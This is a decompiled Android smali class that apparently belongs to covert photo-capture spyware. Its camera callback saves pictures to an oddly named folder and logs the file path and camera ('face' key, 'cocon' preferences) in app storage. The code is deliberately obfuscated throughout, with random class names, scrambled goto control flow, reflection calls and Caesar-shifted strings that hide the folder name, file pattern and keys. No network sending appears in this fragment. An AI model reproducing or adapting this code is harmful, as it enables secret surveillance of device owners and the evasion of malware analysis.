.class public Lcom/EDzgPz/KwIOuS/JhfupU;
.super Ljava/lang/Object;

# interfaces
.implements Landroid/hardware/Camera$PictureCallback;


# instance fields
.field private final context:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 4
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    nop

    goto :goto_2

    :goto_0
    nop

    return-void

    nop

    goto :goto_3

    :goto_1
    nop

    iput-object p1, p0, Lcom/EDzgPz/KwIOuS/JhfupU;->context:Landroid/content/Context;

    nop

    goto :goto_0

    :goto_2
    nop

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    nop

    goto :goto_1

    :goto_3
    nop

    nop
.end method

.method private getDir()Ljava/io/File;
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/JhfupU;->xgetDir()Ljava/io/File;

    move-result-object v0

    return-object v0
.end method

.method private xgetDir()Ljava/io/File;
    .locals 7

    .prologue
    nop

    goto :goto_5

    :goto_0
    nop

    return-object v1

    nop

    goto :goto_6

    :goto_1
    nop

    invoke-direct {v1, v0, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    nop

    goto :goto_0

    :goto_2
    nop

    const-string v2, "DbnfsbEbub888"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_1

    :goto_3
    nop

    new-instance v1, Ljava/io/File;

    nop

    goto :goto_2

    :goto_4
    nop

    const/4 v3, 0x1

    new-array v4, v3, [Ljava/lang/Class;

    new-array v5, v3, [Ljava/lang/Object;

    const/4 v3, 0x0

    const-class v6, Ljava/lang/String;

    aput-object v6, v4, v3

    aput-object v1, v5, v3

    const-string v3, "getExternalStoragePublicDirectory"

    const-class v6, Landroid/os/Environment;

    invoke-virtual {v6, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    const/4 v6, 0x0

    invoke-virtual {v3, v6, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/io/File;

    nop

    goto :goto_3

    :goto_5
    nop

    sget-object v1, Landroid/os/Environment;->DIRECTORY_PICTURES:Ljava/lang/String;

    nop

    goto :goto_4

    :goto_6
    nop

    nop
.end method

.method private xonPictureTaken([BLandroid/hardware/Camera;)V
    .locals 12
    .param p1, "data"    # [B
    .param p2, "camera"    # Landroid/hardware/Camera;

    .prologue
    nop

    goto/16 :goto_37

    :goto_0
    nop

    goto/16 :goto_29

    nop

    goto/16 :goto_38

    :catch_0
    :goto_1
    move-exception v9

    nop

    goto :goto_0

    :goto_2
    nop

    goto/16 :goto_29

    nop

    goto :goto_1

    :goto_3
    :try_start_0
    nop

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    nop

    goto :goto_2

    :goto_4
    nop

    invoke-interface {v2, v9, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    nop

    goto :goto_3

    :goto_5
    nop

    const-string v9, "gbdf"

    invoke-static/range {v9 .. v9}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    nop

    goto :goto_4

    :goto_6
    nop

    invoke-interface {v2, v9, v10}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    nop

    goto :goto_5

    :goto_7
    nop

    const/4 v10, 0x1

    nop

    goto :goto_6

    :goto_8
    nop

    const-string v9, "dbnfsb"

    invoke-static/range {v9 .. v9}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    nop

    goto :goto_7

    :goto_9
    nop

    invoke-interface {v8}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    nop

    goto :goto_8

    :goto_a
    nop

    invoke-virtual {v9, v10, v11}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v8

    nop

    goto :goto_9

    :goto_b
    nop

    const/4 v11, 0x0

    nop

    goto :goto_a

    :goto_c
    nop

    const-string v10, "dpdpo"

    invoke-static/range {v10 .. v10}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    nop

    goto :goto_b

    :goto_d
    nop

    iget-object v9, p0, Lcom/EDzgPz/KwIOuS/JhfupU;->context:Landroid/content/Context;

    nop

    goto :goto_c

    :goto_e
    nop

    invoke-virtual {v4}, Ljava/io/FileOutputStream;->close()V

    nop

    goto :goto_d

    :goto_f
    nop

    invoke-virtual {v4, p1}, Ljava/io/FileOutputStream;->write([B)V

    nop

    goto :goto_e

    :goto_10
    nop

    invoke-direct {v4, v6}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    nop

    goto :goto_f

    :goto_11
    nop

    new-instance v4, Ljava/io/FileOutputStream;

    nop

    goto :goto_10
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_12
    nop

    invoke-direct {v6, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_11

    :goto_13
    nop

    new-instance v6, Ljava/io/File;

    nop

    goto :goto_12

    :goto_14
    nop

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_13

    :goto_15
    nop

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    nop

    goto :goto_14

    :goto_16
    nop

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    nop

    goto :goto_15

    :goto_17
    nop

    sget-object v10, Ljava/io/File;->separator:Ljava/lang/String;

    nop

    goto :goto_16

    :goto_18
    nop

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_17

    :goto_19
    nop

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    nop

    goto :goto_18

    :goto_1a
    nop

    invoke-virtual {v7}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v10

    nop

    goto :goto_19

    :goto_1b
    nop

    new-instance v9, Ljava/lang/StringBuilder;

    nop

    goto :goto_1a

    :goto_1c
    nop

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    nop

    goto :goto_1b

    :goto_1d
    nop

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    nop

    goto :goto_1c

    :goto_1e
    nop

    const-string v10, "/kqh"

    invoke-static/range {v10 .. v10}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    nop

    goto :goto_1d

    :goto_1f
    nop

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    nop

    goto :goto_1e

    :goto_20
    nop

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_1f

    :goto_21
    nop

    const-string v10, "Qjduvsf`"

    invoke-static/range {v10 .. v10}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    nop

    goto :goto_20

    :goto_22
    nop

    new-instance v9, Ljava/lang/StringBuilder;

    nop

    goto :goto_21

    :goto_23
    nop

    invoke-virtual {v1, v9}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v0

    nop

    goto :goto_22

    :goto_24
    nop

    invoke-direct {v9}, Ljava/util/Date;-><init>()V

    nop

    goto :goto_23

    :goto_25
    nop

    new-instance v9, Ljava/util/Date;

    nop

    goto :goto_24

    :goto_26
    nop

    invoke-direct {v1, v9}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_25

    :goto_27
    nop

    const-string v9, "zzzznneeiinntt"

    invoke-static/range {v9 .. v9}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    nop

    goto :goto_26

    :cond_0
    :goto_28
    nop

    new-instance v1, Ljava/text/SimpleDateFormat;

    nop

    goto :goto_27

    :goto_29
    nop

    return-void

    nop

    goto :goto_28

    :goto_2a
    nop

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    nop

    goto :goto_29

    :goto_2b
    nop

    invoke-interface {v2, v9, v10}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    nop

    goto :goto_2a

    :goto_2c
    nop

    const/4 v10, 0x2

    nop

    goto :goto_2b

    :goto_2d
    nop

    const-string v9, "dbnfsb"

    invoke-static/range {v9 .. v9}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    nop

    goto :goto_2c

    :goto_2e
    nop

    invoke-interface {v8}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    nop

    goto :goto_2d

    :goto_2f
    nop

    invoke-virtual {v9, v10, v11}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v8

    nop

    goto :goto_2e

    :goto_30
    nop

    const-string v10, "dpdpo"

    invoke-static/range {v10 .. v10}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    nop

    goto :goto_2f

    :goto_31
    nop

    iget-object v9, p0, Lcom/EDzgPz/KwIOuS/JhfupU;->context:Landroid/content/Context;

    nop

    goto :goto_30

    :goto_32
    nop

    if-nez v9, :cond_0

    nop

    goto :goto_31

    :goto_33
    nop

    invoke-virtual {v7}, Ljava/io/File;->mkdirs()Z

    move-result v9

    nop

    goto :goto_32

    :goto_34
    nop

    if-nez v9, :cond_0

    nop

    goto :goto_33

    :goto_35
    nop

    invoke-virtual {v7}, Ljava/io/File;->exists()Z

    move-result v9

    nop

    goto :goto_34

    :goto_36
    nop

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/JhfupU;->getDir()Ljava/io/File;

    move-result-object v7

    nop

    goto :goto_35

    :goto_37
    nop

    const/4 v11, 0x0

    nop

    goto :goto_36

    :goto_38
    nop

    nop
.end method


# virtual methods
.method public onPictureTaken([BLandroid/hardware/Camera;)V
    .locals 4

    invoke-direct {p0, p1, p2}, Lcom/EDzgPz/KwIOuS/JhfupU;->xonPictureTaken([BLandroid/hardware/Camera;)V

    return-void
.end method
